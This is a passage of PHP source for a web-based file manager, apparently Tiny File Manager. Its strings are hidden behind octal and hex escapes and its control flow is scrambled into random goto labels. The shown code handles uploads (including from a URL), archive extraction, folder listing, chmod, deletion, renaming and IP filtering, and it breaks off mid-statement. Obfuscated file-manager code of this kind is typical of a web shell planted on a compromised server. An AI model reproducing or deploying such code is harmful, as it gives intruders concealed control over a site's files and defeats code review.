            <?php  $path = fm_clean_path($path); $root_url = "\74\141\x20\150\x72\x65\146\75\47\77\x70\75\x27\76\74\151\x20\143\154\x61\x73\x73\75\x27\x66\x61\40\x66\x61\55\150\157\155\145\x27\40\141\x72\151\x61\55\x68\151\x64\144\145\156\x3d\x27\x74\162\x75\x65\x27\40\164\x69\x74\154\145\75\x27" . FM_ROOT_PATH . "\x27\x3e\x3c\x2f\x69\76\74\x2f\141\x3e"; $sep = "\x3c\151\40\x63\154\141\x73\x73\75\42\142\162\145\141\144\x2d\143\162\x75\155\142\x22\76\40\57\x20\x3c\57\151\x3e"; if ($path != '') { $exploded = explode("\57", $path); $count = count($exploded); $array = array(); $parent = ''; for ($i = 0; $i < $count; $i++) { $parent = trim($parent . "\x2f" . $exploded[$i], "\57"); $parent_enc = urlencode($parent); $array[] = "\74\x61\x20\150\x72\145\x66\x3d\47\77\160\x3d{$parent_enc}\47\x3e" . fm_enc(fm_convert_win($exploded[$i])) . "\74\57\141\76"; } $root_url .= $sep . implode($sep, $array); } echo "\x3c\144\x69\x76\x20\143\x6c\141\163\163\75\42\x63\157\154\x2d\170\163\55\x36\40\143\157\x6c\x2d\163\155\55\65\x22\76" . $root_url . "\x3c\x2f\144\x69\166\76"; ?>

            <div class="col-xs-6 col-sm-7 text-right">
                <ul class="navbar-nav mr-auto float-right <?php  echo fm_get_theme(); ?>
">
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="<?php  echo lng("\123\x65\x61\162\x63\x68"); ?>
" aria-label="<?php  echo lng("\123\145\141\x72\143\150"); ?>
" aria-describedby="search-addon2" id="search-addon">
                            <div class="input-group-append">
                                <span class="input-group-text" id="search-addon2"><i class="fa fa-search"></i></span>
                            </div>
                            <div class="input-group-append btn-group">
                                <span class="input-group-text dropdown-toggle" id="search-addon2" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
                                <div class="dropdown-menu dropdown-menu-right">
                                    <a class="dropdown-item" href="<?php  echo $path2 = $path ? $path : "\56"; ?>
" id="js-search-modal" data-toggle="modal" data-target="#searchModal"><?php  echo lng("\x41\x64\166\141\156\x63\x65\x64\x20\x53\x65\x61\162\143\150"); ?>
</a>
                                </div>
                            </div>
                        </div>
                    </li>
                    <?php  if (!FM_READONLY) { ?>
                        <li class="nav-item">
                            <a title="<?php  echo lng("\125\160\154\157\x61\x64"); ?>
" class="nav-link" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php  echo lng("\125\160\154\x6f\x61\144"); ?>
</a>
                        </li>
                        <li class="nav-item">
                            <a title="<?php  echo lng("\x4e\x65\167\x49\164\145\155"); ?>
" class="nav-link" href="#createNewItem" data-toggle="modal" data-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php  echo lng("\x4e\145\x77\111\x74\x65\155"); ?>
</a>
                        </li>
                    <?php  } ?>
                    <?php  if (FM_USE_AUTH) { ?>
                        <li class="nav-item avatar dropdown">
                            <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="fa fa-user-circle"></i> <?php  if (isset($_SESSION[FM_SESSION_ID]["\x6c\157\147\x67\145\x64"])) { echo $_SESSION[FM_SESSION_ID]["\154\157\x67\147\145\x64"]; } ?>
</a>
                            <div class="dropdown-menu dropdown-menu-right <?php  echo fm_get_theme(); ?>
" aria-labelledby="navbarDropdownMenuLink-5">
                                <?php  if (!FM_READONLY) { ?>
                                    <a title="<?php  echo lng("\x53\145\x74\x74\151\x6e\147\163"); ?>
" class="dropdown-item nav-link" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php  echo lng("\x53\145\x74\x74\151\156\147\163"); ?>
</a>
                                <?php  } ?>
                                <a title="<?php  echo lng("\110\145\154\x70"); ?>
" class="dropdown-item nav-link" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php  echo lng("\110\x65\154\x70"); ?>
</a>
                                <a title="<?php  echo lng("\x4c\x6f\147\157\x75\164"); ?>
" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php  echo lng("\114\x6f\147\157\x75\164"); ?>
</a>
                            </div>
                        </li>
                    <?php  } else { ?>
                        <?php  if (!FM_READONLY) { ?>
                            <li class="nav-item">
                                <a title="<?php  echo lng("\123\145\x74\x74\x69\156\147\x73"); ?>
" class="dropdown-item nav-link" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php  echo lng("\123\x65\x74\164\x69\x6e\147\163"); ?>
</a>
                            </li>
                        <?php  } ?>
                    <?php  } ?>
                </ul>
            </div>
        </div>
    </nav>
    <?php  } goto f_f3P; U6K1Z: defined("\106\115\x5f\123\x48\117\127\x5f\x48\111\104\104\x45\x4e") || define("\x46\x4d\x5f\x53\x48\x4f\127\x5f\x48\111\x44\104\x45\116", $show_hidden_files); goto RXaJB; tly6X: $cfg = new FM_Config(); goto YHHhC; iVQCZ: if (isset($_GET["\x75\x70\154\x6f\141\144"]) && !FM_READONLY) { fm_show_header(); fm_show_nav_path(FM_PATH); function getUploadExt() { $extArr = explode("\54", FM_UPLOAD_EXTENSION); if (FM_UPLOAD_EXTENSION && $extArr) { array_walk($extArr, function (&$x) { $x = "\56{$x}"; }); return implode("\x2c", $extArr); } return ''; } ?>

    <link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.5.1/min/dropzone.min.css" rel="stylesheet">
    <div class="path">

        <div class="card mb-2 fm-upload-wrapper <?php  echo fm_get_theme(); ?>
">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php  echo lng("\x55\160\x6c\157\x61\144\x69\156\x67\x46\151\154\145\163"); ?>
</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> Upload from URL</a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <p class="card-text">
                    <a href="?p=<?php  echo FM_PATH; ?>
" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php  echo lng("\102\141\143\153"); ?>
</a>
                    <?php  echo lng("\x44\x65\163\x74\151\156\141\164\x69\x6f\156\106\x6f\x6c\x64\145\x72"); ?>
: <?php  echo fm_enc(fm_convert_win(FM_PATH)); ?>
                </p>

                <form action="<?php  echo htmlspecialchars(FM_SELF_URL) . "\x3f\x70\75" . fm_enc(FM_PATH); ?>
" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
                    <input type="hidden" name="p" value="<?php  echo fm_enc(FM_PATH); ?>
">
                    <input type="hidden" name="fullpath" id="fullpath" value="<?php  echo fm_enc(FM_PATH); ?>
">
                    <div class="fallback">
                        <input name="file" type="file" multiple/>
                    </div>
                </form>

                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
                    <form id="js-form-url-upload" class="form-inline" onsubmit="return upload_from_url(this);" method="POST" action="">
                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
                        <button type="submit" class="btn btn-primary ml-3"><?php  echo lng("\125\x70\x6c\157\x61\144"); ?>
</button>
                        <div class="lds-facebook"><div></div><div></div><div></div></div>
                    </form>
                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.5.1/min/dropzone.min.js"></script>
    <script>
        Dropzone.options.fileUploader = {
            timeout: 120000,
            maxFilesize: <?php  echo MAX_UPLOAD_SIZE; ?>
,
            acceptedFiles : "<?php  echo getUploadExt(); ?>
",
            init: function () {
                this.on("sending", function (file, xhr, formData) {
                    let _path = (file.fullPath) ? file.fullPath : file.name;
                    document.getElementById("fullpath").value = _path;
                    xhr.ontimeout = (function() {
                        toast('Error: Server Timeout');
                    });
                }).on("success", function (res) {
                    let _response = JSON.parse(res.xhr.response);
                    if(_response.status == "error") {
                        toast(_response.info);
                    }
                }).on("error", function(file, response) {
                    toast(response);
                });
            }
        }
    </script>
    <?php  fm_show_footer(); die; } goto oxVn5; oZAr3: if (isset($_GET["\x75\156\172\x69\160"]) && !FM_READONLY) { $unzip = $_GET["\x75\156\x7a\x69\160"]; $unzip = fm_clean_path($unzip); $unzip = str_replace("\57", '', $unzip); $isValid = false; $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } if ($unzip != '' && is_file($path . "\57" . $unzip)) { $zip_path = $path . "\57" . $unzip; $ext = pathinfo($zip_path, PATHINFO_EXTENSION); $isValid = true; } else { fm_set_msg(lng("\x46\x69\x6c\x65\x20\156\x6f\x74\40\146\157\x75\x6e\x64"), "\145\162\162\x6f\162"); } if ($ext == "\172\151\160" && !class_exists("\132\x69\x70\x41\x72\x63\150\151\x76\145") || $ext == "\x74\141\x72" && !class_exists("\120\x68\141\x72\x44\141\164\141")) { fm_set_msg(lng("\x4f\x70\145\x72\x61\x74\151\157\x6e\163\x20\167\x69\164\x68\x20\x61\162\x63\150\x69\x76\145\163\x20\141\x72\x65\x20\x6e\157\164\40\x61\x76\x61\x69\154\x61\x62\x6c\145"), "\x65\x72\x72\x6f\x72"); fm_redirect(FM_SELF_URL . "\x3f\160\75" . urlencode(FM_PATH)); } if ($isValid) { $tofolder = ''; if (isset($_GET["\164\x6f\146\x6f\154\144\145\x72"])) { $tofolder = pathinfo($zip_path, PATHINFO_FILENAME); if (fm_mkdir($path . "\x2f" . $tofolder, true)) { $path .= "\x2f" . $tofolder; } } if ($ext == "\172\151\160") { $zipper = new FM_Zipper(); $res = $zipper->unzip($zip_path, $path); } elseif ($ext == "\164\x61\162") { try { $gzipper = new PharData($zip_path); if (@$gzipper->extractTo($path, null, true)) { $res = true; } else { $res = false; } } catch (Exception $e) { $res = true; } } if ($res) { fm_set_msg(lng("\x41\162\x63\x68\x69\166\145\40\x75\x6e\160\x61\143\153\145\144")); } else { fm_set_msg(lng("\x41\162\x63\x68\151\166\x65\x20\x6e\157\x74\x20\165\156\x70\141\143\x6b\145\x64"), "\145\162\x72\x6f\x72"); } } else { fm_set_msg(lng("\x46\151\154\x65\x20\x6e\157\164\40\146\157\165\156\144"), "\x65\x72\x72\x6f\162"); } fm_redirect(FM_SELF_URL . "\x3f\x70\75" . urlencode(FM_PATH)); } goto LCyks; p61sN: ?>
</th>
                    <th><?php  goto KhsK1; oG9eX: $_POST = strpos($input, "\x61\x6a\x61\170") != FALSE && strpos($input, "\163\x61\x76\x65") != FALSE ? json_decode($input, true) : $_POST; goto Gp8k_; KhsK1: echo lng("\x4d\x6f\x64\151\146\x69\145\144"); goto FeZIU; N8VzF: if ($ip_ruleset != "\117\106\106") { $clientIp = $_SERVER["\x52\105\x4d\x4f\124\105\137\101\104\104\x52"]; $proceed = false; $whitelisted = in_array($clientIp, $ip_whitelist); $blacklisted = in_array($clientIp, $ip_blacklist); if ($ip_ruleset == "\101\x4e\104") { if ($whitelisted == true && $blacklisted == false) { $proceed = true; } } else { if ($ip_ruleset == "\117\x52") { if ($whitelisted == true || $blacklisted == false) { $proceed = true; } } } if ($proceed == false) { trigger_error("\x55\x73\145\162\x20\143\x6f\156\x6e\x65\x63\164\151\x6f\156\x20\x64\x65\x6e\151\145\144\x20\146\x72\x6f\155\x3a\40" . $clientIp, E_USER_WARNING); if ($ip_silent == false) { fm_set_msg(lng("\101\x63\143\145\x73\163\x20\x64\145\156\151\145\144\x2e\40\x49\120\x20\162\x65\x73\x74\162\151\143\x74\x69\x6f\156\x20\141\160\160\x6c\x69\x63\x61\142\154\x65"), "\145\x72\162\x6f\x72"); fm_show_header_login(); fm_show_message(); } die; } } goto UKsq5; vHW8m: function fm_rcopy($path, $dest, $upd = true, $force = true) { if (is_dir($path)) { if (!fm_mkdir($dest, $force)) { return false; } $objects = scandir($path); $ok = true; if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\56\x2e") { if (!fm_rcopy($path . "\x2f" . $file, $dest . "\x2f" . $file)) { $ok = false; } } } } return $ok; } elseif (is_file($path)) { return fm_copy($path, $dest, $upd); } return false; } goto Owes3; PBVeg: function fm_get_zif_info($path, $ext) { if ($ext == "\x7a\x69\160" && function_exists("\172\x69\160\x5f\157\x70\x65\156")) { $arch = zip_open($path); if ($arch) { $filenames = array(); while ($zip_entry = zip_read($arch)) { $zip_name = zip_entry_name($zip_entry); $zip_folder = substr($zip_name, -1) == "\x2f"; $filenames[] = array("\x6e\x61\155\x65" => $zip_name, "\x66\151\154\x65\x73\x69\x7a\145" => zip_entry_filesize($zip_entry), "\x63\157\x6d\160\162\x65\163\x73\x65\144\137\x73\x69\172\x65" => zip_entry_compressedsize($zip_entry), "\146\x6f\154\x64\145\x72" => $zip_folder); } zip_close($arch); return $filenames; } } elseif ($ext == "\164\x61\x72" && class_exists("\120\x68\141\x72\104\141\164\141")) { $archive = new PharData($path); $filenames = array(); foreach (new RecursiveIteratorIterator($archive) as $file) { $parent_info = $file->getPathInfo(); $zip_name = str_replace("\160\150\x61\x72\72\x2f\x2f" . $path, '', $file->getPathName()); $zip_name = substr($zip_name, ($pos = strpos($zip_name, "\57")) !== false ? $pos + 1 : 0); $zip_folder = $parent_info->getFileName(); $zip_info = new SplFileInfo($file); $filenames[] = array("\x6e\x61\155\145" => $zip_name, "\x66\151\x6c\x65\x73\151\x7a\x65" => $zip_info->getSize(), "\143\x6f\155\160\162\145\163\x73\x65\144\137\x73\x69\x7a\145" => $file->getCompressedSize(), "\146\x6f\154\144\145\x72" => $zip_folder); } return $filenames; } return false; } goto A7_N8; EbtKU: foreach ($folders as $f) { $is_link = is_link($path . "\57" . $f); $img = $is_link ? "\151\143\x6f\156\55\x6c\x69\156\153\137\146\x6f\154\x64\x65\x72" : "\x66\141\40\x66\x61\55\146\157\x6c\x64\145\x72\55\157"; $modif_raw = filemtime($path . "\x2f" . $f); $modif = date(FM_DATETIME_FORMAT, $modif_raw); if ($calc_folder) { $filesize_raw = fm_get_directorysize($path . "\57" . $f); $filesize = fm_get_filesize($filesize_raw); } else { $filesize_raw = ''; $filesize = lng("\x46\157\154\x64\145\162"); } $perms = substr(decoct(fileperms($path . "\57" . $f)), -4); if (function_exists("\x70\157\x73\x69\170\137\x67\145\x74\x70\167\165\x69\x64") && function_exists("\x70\157\163\x69\x78\137\147\x65\164\147\162\x67\151\144")) { $owner = posix_getpwuid(fileowner($path . "\57" . $f)); $group = posix_getgrgid(filegroup($path . "\x2f" . $f)); } else { $owner = array("\x6e\x61\x6d\145" => "\77"); $group = array("\156\141\155\145" => "\x3f"); } ?>
                    <tr>
                        <?php  if (!FM_READONLY) { ?>
                            <td class="custom-checkbox-td">
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="<?php  echo $ii; ?>
" name="file[]" value="<?php  echo fm_enc($f); ?>
">
                                <label class="custom-control-label" for="<?php  echo $ii; ?>
"></label>
                            </div>
                            </td><?php  } ?>
                        <td>
                            <div class="filename"><a href="?p=<?php  echo urlencode(trim(FM_PATH . "\57" . $f, "\57")); ?>
"><i class="<?php  echo $img; ?>
"></i> <?php  echo fm_convert_win(fm_enc($f)); ?>
                                </a><?php  echo $is_link ? "\x20\46\162\x61\x72\x72\73\40\x3c\x69\76" . readlink($path . "\x2f" . $f) . "\x3c\57\151\x3e" : ''; ?>
</div>
                        </td>
                        <td data-sort="a-<?php  echo str_pad($filesize_raw, 18, "\x30", STR_PAD_LEFT); ?>
">
                            <?php  echo $filesize; ?>
                        </td>
                        <td data-sort="a-<?php  echo $modif_raw; ?>
"><?php  echo $modif; ?>
</td>
                        <?php  if (!FM_IS_WIN && !$hide_Cols) { ?>
                            <td><?php  if (!FM_READONLY) { ?>
<a title="Change Permissions" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;chmod=<?php  echo urlencode($f); ?>
"><?php  echo $perms; ?>
</a><?php  } else { echo $perms; } ?>
                            </td>
                            <td><?php  echo $owner["\x6e\x61\155\x65"] . "\x3a" . $group["\156\x61\x6d\145"]; ?>
</td>
                        <?php  } ?>
                        <td class="inline-actions"><?php  if (!FM_READONLY) { ?>
                                <a title="<?php  echo lng("\104\145\x6c\x65\164\145"); ?>
" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;del=<?php  echo urlencode($f); ?>
" onclick="return confirm('<?php  echo lng("\104\145\154\145\x74\x65") . "\40" . lng("\x46\157\154\x64\145\x72") . "\x3f"; ?>
\n \n ( <?php  echo urlencode($f); ?>
 )');"> <i class="fa fa-trash-o" aria-hidden="true"></i></a>
                                <a title="<?php  echo lng("\122\145\x6e\x61\x6d\145"); ?>
" href="#" onclick="rename('<?php  echo fm_enc(addslashes(FM_PATH)); ?>
', '<?php  echo fm_enc(addslashes($f)); ?>
');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
                                <a title="<?php  echo lng("\x43\x6f\160\x79\x54\x6f"); ?>
..." href="?p=&amp;copy=<?php  echo urlencode(trim(FM_PATH . "\x2f" . $f, "\57")); ?>
"><i class="fa fa-files-o" aria-hidden="true"></i></a>
                            <?php  } ?>
                            <a title="<?php  echo lng("\x44\x69\x72\145\x63\x74\x4c\151\x6e\153"); ?>
" href="<?php  echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? "\57" . FM_PATH : '') . "\x2f" . $f . "\57"); ?>
" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
                        </td>
                    </tr>
                    <?php  flush(); $ii++; } goto Rzv8n; nHlkJ: fm_show_header(); goto H7jy2; qVEX9: $all_files_size = 0; goto tw0by; FGvAx: $use_auth = true; goto IKZ08; Cf19T: function lng($txt) { global $lang; $tr["\145\156"]["\x41\x70\x70\116\x61\x6d\145"] = "\124\x69\156\171\x20\x46\x69\x6c\145\x20\x4d\x61\x6e\141\x67\145\x72"; $tr["\x65\x6e"]["\101\x70\x70\124\x69\x74\154\x65"] = "\x46\x69\154\145\x20\115\141\156\x61\147\x65\x72"; $tr["\x65\156"]["\114\157\x67\151\x6e"] = "\x53\x69\x67\x6e\x20\151\156"; $tr["\x65\156"]["\x55\163\x65\162\156\x61\x6d\145"] = "\125\x73\145\x72\x6e\141\x6d\x65"; $tr["\x65\156"]["\x50\141\163\x73\x77\x6f\x72\144"] = "\x50\141\163\x73\x77\x6f\x72\144"; $tr["\x65\x6e"]["\x4c\x6f\x67\x6f\165\x74"] = "\123\x69\x67\156\40\x4f\x75\164"; $tr["\145\156"]["\x4d\157\x76\145"] = "\115\157\x76\145"; $tr["\145\x6e"]["\x43\157\x70\x79"] = "\x43\157\160\171"; $tr["\145\156"]["\123\x61\x76\x65"] = "\x53\141\166\x65"; $tr["\x65\x6e"]["\123\x65\x6c\x65\143\164\101\154\154"] = "\123\145\154\x65\x63\164\40\x61\x6c\x6c"; $tr["\145\x6e"]["\125\x6e\123\145\154\145\x63\x74\101\154\154"] = "\x55\x6e\163\145\154\x65\x63\164\40\x61\x6c\x6c"; $tr["\x65\x6e"]["\106\151\154\145"] = "\x46\x69\154\x65"; $tr["\x65\x6e"]["\x42\141\x63\x6b"] = "\x42\141\x63\153"; $tr["\x65\156"]["\x53\151\172\x65"] = "\123\151\x7a\x65"; $tr["\145\x6e"]["\x50\x65\162\x6d\163"] = "\120\x65\x72\155\x73"; $tr["\145\x6e"]["\115\x6f\144\151\146\x69\145\x64"] = "\x4d\x6f\144\151\x66\x69\145\144"; $tr["\145\156"]["\x4f\x77\156\x65\162"] = "\117\x77\x6e\145\162"; $tr["\x65\156"]["\123\145\x61\x72\x63\x68"] = "\x53\145\141\162\x63\x68"; $tr["\145\x6e"]["\116\x65\167\x49\164\x65\x6d"] = "\116\x65\167\x20\111\164\x65\x6d"; $tr["\x65\156"]["\106\x6f\x6c\144\x65\x72"] = "\x46\157\154\144\x65\x72"; $tr["\x65\156"]["\x44\x65\x6c\x65\164\x65"] = "\104\145\154\x65\x74\145"; $tr["\145\156"]["\x52\x65\156\141\x6d\145"] = "\x52\145\x6e\x61\x6d\145"; $tr["\x65\x6e"]["\103\x6f\160\x79\124\157"] = "\x43\x6f\160\x79\x20\164\x6f"; $tr["\145\x6e"]["\104\x69\x72\145\x63\x74\x4c\x69\156\x6b"] = "\104\151\x72\x65\x63\x74\40\154\151\156\153"; $tr["\145\156"]["\x55\160\x6c\x6f\x61\x64\151\156\147\106\x69\154\x65\163"] = "\125\160\154\x6f\x61\x64\x20\x46\x69\x6c\x65\163"; $tr["\x65\x6e"]["\x43\150\x61\156\147\145\x50\145\x72\x6d\x69\x73\163\151\x6f\156\x73"] = "\103\x68\x61\156\147\145\40\120\x65\x72\155\151\163\163\151\x6f\x6e\x73"; $tr["\145\156"]["\103\x6f\x70\171\x69\156\147"] = "\103\157\x70\171\x69\156\x67"; $tr["\x65\x6e"]["\x43\x72\x65\141\x74\x65\116\x65\x77\111\164\x65\155"] = "\x43\x72\145\x61\164\145\40\116\x65\x77\40\111\164\145\x6d"; $tr["\x65\156"]["\x4e\x61\x6d\145"] = "\x4e\141\x6d\x65"; $tr["\x65\156"]["\101\x64\166\141\156\143\x65\144\x45\x64\151\164\x6f\162"] = "\x41\x64\166\141\x6e\x63\145\144\40\105\x64\x69\x74\157\162"; $tr["\x65\156"]["\122\145\155\145\x6d\142\145\x72\115\x65"] = "\x52\145\155\x65\155\142\x65\162\x20\115\145"; $tr["\145\x6e"]["\101\143\164\x69\x6f\x6e\x73"] = "\101\143\164\x69\157\156\163"; $tr["\x65\156"]["\125\x70\154\157\141\144"] = "\x55\160\154\x6f\x61\144"; $tr["\145\156"]["\x43\141\156\143\x65\154"] = "\103\141\156\x63\145\154"; $tr["\x65\x6e"]["\111\156\166\x65\162\x74\x53\145\x6c\x65\x63\164\151\x6f\x6e"] = "\x49\x6e\166\x65\162\x74\40\x53\x65\154\145\x63\x74\151\157\156"; $tr["\x65\x6e"]["\x44\145\x73\x74\x69\x6e\141\164\x69\157\x6e\x46\157\x6c\x64\145\162"] = "\x44\145\163\164\151\x6e\141\164\x69\157\x6e\40\106\x6f\154\144\145\162"; $tr["\145\156"]["\x49\164\x65\x6d\124\171\160\145"] = "\x49\x74\145\155\x20\124\171\160\x65"; $tr["\145\156"]["\x49\x74\145\155\116\141\x6d\x65"] = "\111\x74\145\x6d\40\116\141\155\145"; $tr["\x65\156"]["\103\162\145\x61\x74\145\116\x6f\167"] = "\x43\162\145\141\164\145\x20\116\157\x77"; $tr["\x65\x6e"]["\x44\x6f\x77\156\x6c\x6f\x61\144"] = "\104\157\167\156\x6c\157\141\x64"; $tr["\x65\x6e"]["\x4f\x70\145\156"] = "\x4f\160\x65\156"; $tr["\145\156"]["\x55\x6e\x5a\151\x70"] = "\125\156\x5a\151\160"; $tr["\x65\x6e"]["\x55\156\x5a\151\160\124\x6f\x46\x6f\x6c\144\x65\x72"] = "\x55\x6e\132\151\160\x20\x74\x6f\x20\x66\157\154\x64\x65\162"; $tr["\145\x6e"]["\x45\144\151\164"] = "\105\144\151\x74"; $tr["\145\x6e"]["\116\x6f\x72\155\x61\x6c\105\x64\x69\164\157\162"] = "\x4e\157\x72\x6d\x61\x6c\40\x45\144\151\164\x6f\x72"; $tr["\145\x6e"]["\x42\141\143\153\x55\x70"] = "\102\141\143\153\40\125\x70"; $tr["\x65\156"]["\123\x6f\x75\x72\x63\145\106\157\154\x64\145\x72"] = "\x53\157\x75\162\143\x65\40\x46\157\x6c\144\145\162"; $tr["\x65\156"]["\106\x69\154\x65\163"] = "\106\x69\154\145\x73"; $tr["\x65\156"]["\x4d\157\166\x65"] = "\x4d\157\166\x65"; $tr["\x65\x6e"]["\103\150\x61\x6e\x67\x65"] = "\x43\x68\x61\x6e\147\x65"; $tr["\x65\156"]["\x53\x65\x74\164\x69\x6e\x67\x73"] = "\x53\145\164\164\151\156\x67\x73"; $tr["\145\156"]["\x4c\141\156\x67\x75\x61\147\145"] = "\x4c\x61\156\147\165\141\x67\x65"; $tr["\145\x6e"]["\106\157\154\x64\x65\162\x20\x69\x73\x20\x65\x6d\160\164\x79"] = "\106\157\x6c\144\145\162\40\x69\x73\40\x65\155\160\x74\171"; $tr["\145\x6e"]["\x50\x61\162\164\151\164\151\157\156\x53\x69\172\145"] = "\120\141\x72\164\151\164\x69\x6f\156\x20\163\151\172\x65"; $tr["\145\156"]["\x45\x72\162\x6f\x72\x52\x65\x70\157\x72\x74\x69\x6e\x67"] = "\105\162\162\157\x72\40\x52\x65\x70\x6f\x72\164\151\156\x67"; $tr["\145\x6e"]["\123\150\x6f\167\110\151\x64\144\145\x6e\x46\151\154\x65\x73"] = "\x53\150\157\x77\x20\x48\x69\x64\144\x65\x6e\40\x46\151\154\145\x73"; $tr["\x65\156"]["\106\x75\x6c\154\40\x73\151\x7a\145"] = "\x46\x75\154\154\40\163\x69\172\x65"; $tr["\145\156"]["\x48\145\154\x70"] = "\x48\x65\x6c\160"; $tr["\145\156"]["\106\162\x65\x65\40\157\146"] = "\106\x72\145\x65\x20\157\x66"; $tr["\145\x6e"]["\120\x72\145\166\x69\x65\x77"] = "\120\x72\x65\x76\151\x65\x77"; $tr["\x65\156"]["\x48\145\154\x70\40\x44\x6f\143\165\155\x65\x6e\x74\x73"] = "\x48\145\x6c\160\x20\x44\x6f\x63\x75\x6d\x65\156\164\163"; $tr["\x65\x6e"]["\x52\x65\160\x6f\x72\164\40\x49\163\x73\x75\x65"] = "\x52\145\160\x6f\x72\x74\x20\x49\x73\163\x75\x65"; $tr["\x65\x6e"]["\x47\145\156\x65\162\x61\164\x65"] = "\x47\145\156\x65\162\141\164\145"; $tr["\145\x6e"]["\106\165\154\x6c\123\x69\172\145"] = "\x46\x75\x6c\x6c\40\123\x69\172\145"; $tr["\x65\x6e"]["\x46\162\x65\x65\117\x66"] = "\x66\162\145\x65\x20\157\146"; $tr["\145\x6e"]["\103\x61\x6c\x63\x75\154\141\x74\x65\106\157\154\x64\145\x72\x53\151\x7a\145"] = "\x43\141\154\143\165\154\x61\164\145\40\x66\157\154\x64\x65\x72\40\163\151\x7a\145"; $tr["\145\x6e"]["\x50\x72\x6f\x63\x65\x73\163\x49\104"] = "\120\162\x6f\143\145\x73\163\x20\x49\104"; $tr["\x65\156"]["\103\x72\x65\x61\164\x65\x64"] = "\x43\162\x65\141\x74\x65\x64"; $tr["\x65\156"]["\x48\151\x64\x65\103\x6f\x6c\x75\x6d\x6e\163"] = "\110\151\144\x65\40\120\145\162\155\x73\x2f\x4f\x77\156\x65\x72\x20\x63\157\x6c\165\x6d\156\163"; $tr["\145\x6e"]["\x59\157\165\40\x61\x72\145\40\154\157\x67\x67\x65\x64\40\151\x6e"] = "\131\x6f\165\x20\141\x72\x65\40\x6c\x6f\147\x67\145\x64\x20\151\x6e"; $tr["\x65\156"]["\x43\x68\145\143\153\x20\114\141\164\145\x73\x74\x20\x56\145\x72\163\151\x6f\156"] = "\103\150\x65\143\153\40\x4c\x61\164\145\163\164\x20\126\145\x72\x73\x69\x6f\156"; $tr["\145\x6e"]["\107\145\156\x65\x72\x61\164\145\x20\x6e\145\167\40\160\x61\163\x73\x77\x6f\x72\x64\40\150\x61\x73\x68"] = "\107\145\156\145\x72\141\x74\x65\x20\156\x65\x77\40\160\141\x73\x73\167\157\x72\x64\x20\x68\x61\x73\x68"; $tr["\145\156"]["\x4c\x6f\147\x69\156\x20\146\x61\x69\154\145\144\x2e\x20\x49\x6e\x76\x61\x6c\151\144\x20\165\x73\x65\x72\x6e\141\155\x65\x20\157\x72\x20\x70\x61\163\163\x77\157\x72\x64"] = "\114\157\147\151\x6e\x20\x66\x61\x69\154\145\x64\56\x20\x49\x6e\x76\x61\154\151\x64\x20\165\163\x65\x72\156\141\155\x65\x20\x6f\x72\40\160\141\x73\x73\167\x6f\x72\144"; $tr["\145\156"]["\160\141\x73\x73\x77\x6f\x72\144\137\150\141\163\150\x20\x6e\157\x74\x20\163\165\x70\160\157\x72\x74\x65\x64\54\x20\x55\160\x67\x72\141\x64\x65\x20\120\x48\120\x20\x76\x65\162\x73\151\x6f\156"] = "\160\141\163\x73\167\x6f\162\144\x5f\x68\x61\x73\x68\x20\x6e\x6f\164\x20\163\165\160\x70\x6f\162\164\x65\144\x2c\x20\x55\x70\147\x72\141\144\x65\40\x50\110\120\40\x76\145\162\163\151\157\156"; $tr["\x65\x6e"]["\x41\x64\166\141\x6e\x63\145\144\40\123\x65\x61\x72\143\x68"] = "\101\144\x76\x61\156\143\145\144\40\123\x65\x61\x72\143\150"; $tr["\145\x6e"]["\105\162\162\157\x72\40\167\150\x69\x6c\x65\40\x63\157\x70\171\x69\x6e\x67\x20\146\162\x6f"] = "\105\162\162\x6f\x72\x20\167\x68\x69\154\145\40\x63\x6f\160\x79\151\156\x67\40\x66\x72\157"; $tr["\145\x6e"]["\x4e\157\164\150\x69\x6e\x67\40\163\145\154\x65\143\x74\x65\144"] = "\x4e\157\x74\x68\151\x6e\147\x20\x73\x65\154\x65\143\x74\x65\144"; $tr["\145\156"]["\x50\141\x74\x68\x73\x20\x6d\165\163\x74\x20\x62\145\40\156\157\164\x20\145\161\x75\141\x6c"] = "\x50\141\x74\150\163\x20\x6d\165\163\x74\40\x62\x65\x20\156\157\x74\x20\145\161\x75\141\x6c"; 